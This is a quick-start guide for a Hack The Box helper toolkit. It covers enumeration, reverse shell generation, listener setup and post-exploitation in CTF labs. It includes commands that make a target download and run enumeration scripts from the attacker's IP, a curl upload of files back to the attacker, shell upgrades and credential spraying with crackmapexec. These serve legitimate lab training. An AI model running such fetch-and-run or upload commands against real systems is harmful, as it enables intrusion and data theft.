# HTB Helper - Quick Start Guide

## Installation

```bash
git clone https://github.com/cywf/htb-helper.git
cd htb-helper
pip3 install -r requirements.txt
```

## Basic Workflow

### 1. Start a New Box

```bash
# Create tmux session for organized workspace
./tmux_setup.sh MyBox

# In the main window, run HTB Helper
python3 cli.py -n MyBox -i 10.10.10.150 -l 10.10.14.5
```

### 2. Enumeration Phase

**In tmux window 1 (nmap):**
```bash
# Additional targeted scans
nmap -sV -sC -p 80,443,22 10.10.10.150
```

**In tmux window 2 (web):**
```bash
# Automated web enumeration
./ctf_scripts/web_fuzz.sh -u http://10.10.10.150 -a
```

**Generate notes for documentation:**
```bash
cd htb/MyBox/notes
python3 ../../ctf_scripts/notes_gen.py -t all -n MyBox -i 10.10.10.150 -o .
```

### 3. Exploitation Phase

**Generate reverse shells (in any window):**
```bash
python3 ctf_scripts/revshell_gen.py -l 10.10.14.5 -p 4444 -a > shells.txt
# Copy desired shell from shells.txt
```

**Start listener (in tmux window 3):**
```bash
./ctf_scripts/listener.sh -p 4444 -r
```

**Start HTTP server for file transfers (in tmux window 3, split pane):**
```bash
./ctf_scripts/http_server.sh -p 8000
```

### 4. Post-Exploitation

**After getting initial shell:**
```bash
# Download and run enumeration script
wget http://10.10.14.5:8000/ctf_scripts/quick_enum.sh
bash quick_enum.sh > enum_output.txt

# Or run LinPEAS
wget http://10.10.14.5:8000/linpeas.sh
bash linpeas.sh
```

**Upgrade shell:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 5. Documentation

**Update notes (in tmux window 5):**
```bash
vim notes/recon_notes.md
# Document findings, vulnerabilities, and steps
```

## Quick Reference

### Generate All Shell Types
```bash
python3 ctf_scripts/revshell_gen.py -l <YOUR_IP> -p 4444 -a
```

### Start Various Listeners
```bash
# Netcat with rlwrap
./ctf_scripts/listener.sh -p 4444 -r

# Socat (better shell)
./ctf_scripts/listener.sh -t socat -p 4444

# Metasploit
./ctf_scripts/listener.sh -t msfconsole -m linux/x86/meterpreter/reverse_tcp
```

### File Transfer Methods
```bash
# Serve files
./ctf_scripts/http_server.sh -p 8000

# On target - download
wget http://<YOUR_IP>:8000/file
curl http://<YOUR_IP>:8000/file -o file

# Upload (if upload enabled)
curl -X POST -F "file=@localfile" http://<YOUR_IP>:8000/upload
```

### Web Enumeration
```bash
# Full scan
./ctf_scripts/web_fuzz.sh -u http://target.com -a

# Just directories
./ctf_scripts/web_fuzz.sh -u http://target.com --dirs

# Custom wordlist
./ctf_scripts/web_fuzz.sh -u http://target.com --dirs -w custom.txt
```

### Tmux Navigation
```
Ctrl+b n         - Next window
Ctrl+b p         - Previous window
Ctrl+b 0-7       - Go to window number
Ctrl+b arrow     - Switch panes
Ctrl+b d         - Detach from session
Ctrl+b ?         - Help
```

## Configuration

Create custom configuration:
```bash
cp htb_helper.example.yaml htb_helper.yaml
# Edit settings
vim htb_helper.yaml
```

## Common Issues

### Port Already in Use
```bash
# Find process using port
sudo lsof -i :4444
# Kill if needed
kill -9 <PID>
```

### Tmux Session Already Exists
```bash
# Attach to existing
tmux attach -t htb-MyBox

# Or kill old session
tmux kill-session -t htb-MyBox
```

### Payload Not Working
- Verify LHOST is correct (your IP, not target IP)
- Check firewall settings
- Ensure listener is running before executing payload
- Try different payload type

## Tips & Tricks

### Always Use Tmux
Organized workspace makes huge difference in efficiency

### Document Everything
Use the notes templates - future you will thank you

### Multiple Listeners
Use different ports for different exploitation attempts

### Test Payloads Locally
Always test your payloads work before using on target

### Backup Your Work
The `htb/` directory contains all your work - back it up regularly

### Use rlwrap
Always use rlwrap with netcat for better shell experience

### Upgrade Shells Immediately
First thing after getting shell - upgrade it

### Save Commands
Keep a terminal history of successful commands

## Advanced Usage

### CLI Automation
```bash
# Scan only
python3 cli.py -n MyBox -i 10.10.10.150 --only-scan

# Skip tool installation
python3 cli.py -n MyBox -i 10.10.10.150 --skip-tools

# Generate payloads only
python3 cli.py -n MyBox -i 10.10.10.150 --only-payloads -l 10.10.14.5
```

### Custom Configuration
```yaml
# htb_helper.yaml
nmap:
  threads: 100
  timeout: 600
  
payloads:
  default_lport: 9001
  
tools:
  repos:
    - https://your-custom-repo.git
```

### Integration with Other Tools
```bash
# Export results for other tools
cat htb/MyBox/nmap/*.txt | grep -o '[0-9]\+/tcp' | cut -d/ -f1 | sort -u

# Generate wordlist from page
cewl http://target.com -m 6 -w wordlist.txt

# Use with crackmapexec
crackmapexec smb 10.10.10.150 -u users.txt -p passwords.txt
```

## Get Help

```bash
# Main help
python3 main.py --help
python3 cli.py --help

# Script help
./ctf_scripts/web_fuzz.sh --help
./ctf_scripts/listener.sh --help
python3 ctf_scripts/revshell_gen.py --help
```

## Contributing

Contributions welcome! Add more:
- Shell types to revshell_gen.py
- Enumeration checks to quick_enum.sh
- Note templates to notes_gen.py
- Scripts to ctf_scripts/

---

Happy Hacking! 🎯
